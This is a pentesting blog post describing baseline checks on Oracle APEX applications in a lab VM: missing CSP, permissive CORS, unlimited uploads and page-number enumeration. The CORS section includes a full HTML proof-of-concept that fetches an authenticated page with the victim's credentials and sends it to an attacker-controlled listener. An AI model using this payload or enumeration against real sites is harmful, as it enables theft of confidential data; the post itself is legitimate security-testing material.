---
title: Basic checks to do when pentesting an Oracle Apex site
tags: [Oracle,Apex]
image: /assets/images/apex-oracle/apex-banner.png
published: true
banner: true
---

# Introduction

Oracle Apex is a platform that allows you to create applications without any need of coding, when I work with a website that was created using it I always start with the same checks so I write this post to show those checks. For these examples we can use the free VM available at [https://www.oracle.com/database/technologies/databaseappdev-vm.html](https://www.oracle.com/database/technologies/databaseappdev-vm.html). Once we have it running We will deploy the example app "Sample File Upload and Download".

![](/assets/images/apex-oracle/sample-upload.png)

Once we have the App deployed and a user added we can log in to it.

![](/assets/images/apex-oracle/login.png)

Now we are inside the site

![](/assets/images/apex-oracle/menu.png)

# Content Security Policy header

The Content Security Policy header is recomended by the ASVS starting from the level 1 (check 14.4.3), but if we check the headers we don't find it.

![](/assets/images/apex-oracle/headers.png)

While Apex does a good job sanitizing any input that a user makes on any App developed on it, having that extra layer of protection is always good, and it is even suggested on the manual [https://docs.oracle.com/en/database/oracle/apex/23.2/aeadm/configuring-http-attributes.html#GUID-E19AA8F4-0292-4437-BA32-FE2B8ACCF63C](https://docs.oracle.com/en/database/oracle/apex/23.2/aeadm/configuring-http-attributes.html#GUID-E19AA8F4-0292-4437-BA32-FE2B8ACCF63C)

# Cross Site Request Forgering

If we send a HTTP Request from a diferent origin we can see that the header "Access-Control-Allow-Origin" reflects any origin we send, and that the header "Access-Control-Allow-Credentials" is set to true.

![](/assets/images/apex-oracle/csrf.png)

While this condtion would make the site vulnerable to Cross Site Request Forgering attacks, there is a couple of restrictions that would block this kind of attack, first, by default browsers protects the cookies to be sent to external sites so the attack wouldn't work on normal browsers.

![](/assets/images/apex-oracle/protection.png)

If by any reason a user disables the protection that would make him vulnerable, we can test this by disabling this protection.

![](/assets/images/apex-oracle/custom.png)

On top of that, every request made by a user has to send the parameter "session", you can think of this parameter as an extra cookie, it is randomly generated every time a user logs in and if a request contains the cookie of session but not the session parameter it will fail, so for an attacker to craft a working payload they would need access to a reverse proxy, WAF, server, etc that is in the middle of the conversation and logs the URLs requested so we can get the session values that are currently active.

![](/assets/images/apex-oracle/session.png)

Asuming these conditions are met we can create a HTMl file that would access a site on the page and send the information to our machine to exfiltrate information.

```html
<!DOCTYPE html>
<head>
 <title>CSRF POC</title>
</head>
<body onload="get()">
<script>
function get(){
    var panel_req = new XMLHttpRequest();
    //Session ID needed to perform the attacks
    session = "12280546138280"
    panel_req.onreadystatechange = function(){
        if(panel_req.readyState == 4 && panel_req.status == 200){
            //Attacker controlled site
            attacker = "http://192.168.56.106:443/receive"
            exfiltrate = new XMLHttpRequest();
            exfiltrate.open("POST", attacker, true);
            exfiltrate.send(panel_req.responseText);
        }
    }
    //URL of the panel to exfiltrate
    URLpanel = "http://192.168.56.147:8080/ords/r/hrrest/sample-file-upload-download/7?session=" + session
    panel_req.open("GET", URLpanel, true);
    panel_req.withCredentials = true;
    panel_req.send()
}
</script>
</body>
</html>
```

Once we have the html file hosted on a file and a listener running we can access to the site with our victim user.

![](/assets/images/apex-oracle/browse-csrf.png)

And after the user access to the site on our receiver we can validate that the information contained on the page was sent to us, while on this example application the information that was hosted there doesn't have a special meaning on a real site we could exfiltrate confidential information that only a small group of users should have access to.

![](/assets/images/apex-oracle/received.png)

While it would be more interesting to make changes on the site those requests go to "/ords/wwv_flow.ajax", and if we try to send a request there from a diferent origin we will get a forbidden response.

![](/assets/images/apex-oracle/post.png)

It is recomended to make the site respond with a Forbidden to any request that comes from a different site to avoid this kind of issues.

# File Upload

If we go to the file upload section we can see that it indicates that any file must have a size under 15MB, but this is just a text set on the page we have to validate that value.

![](/assets/images/apex-oracle/file-upload.png)

If we go to the admin side of the panel we can see that there is no size limit, due this any user would be able to fill up the disk space with garbage files, it's also worth noting that by default there is no restriction to the files types that can be uploaded.

![](/assets/images/apex-oracle/upload-admin.png)

Another thing to consider is that the files uploaded to a site developed on Apex are not stored inside the disk as simple files, but they are stored inside the database as Blobs, making it imposible to use a software antivirus to make sure malware is not being uploaded to the platform, to scan the files uploaded we have to set up an ICAP server and configure Apex to connect to it [https://support.oracle.com/knowledge/Middleware/2665869_1.html](https://support.oracle.com/knowledge/Middleware/2665869_1.html).

# Site enumeration

If we analyze the HTTP code of any page on the site we can notice that it includes a page-*number*.

![](/assets/images/apex-oracle/page-num.png)

Actually we can use that number to access to any site instead of using the page name.

![](/assets/images/apex-oracle/page-site.png)

These numbers are defined by the developers.

![](/assets/images/apex-oracle/page-admin.png)

To make a simple test we create a comment page with a high number.

![](/assets/images/apex-oracle/new-page.png)

An then let's eliminate it from the menu so there is no way for a user to know it exists.

![](/assets/images/apex-oracle/navigation.png)

Now if we access to the site we don't see any changes on the menu.

![](/assets/images/apex-oracle/deleted.png)

Since we can access to any page by its number it's easy to bruteforce the pages.

![](/assets/images/apex-oracle/fuzz.png)

On this example we are using the fuzzer module of Zaproxy.

![](/assets/images/apex-oracle/zapfuzz.png)

After running the fuzzing we can see that we were able to find the hidden page.

![](/assets/images/apex-oracle/output-fuzz.png)

Nothe that we actually don't need to have a valid session to achieve that, if we try to bruteforce the pages without a session we will get redirected when a page exists on the site

![](/assets/images/apex-oracle/nologin.png)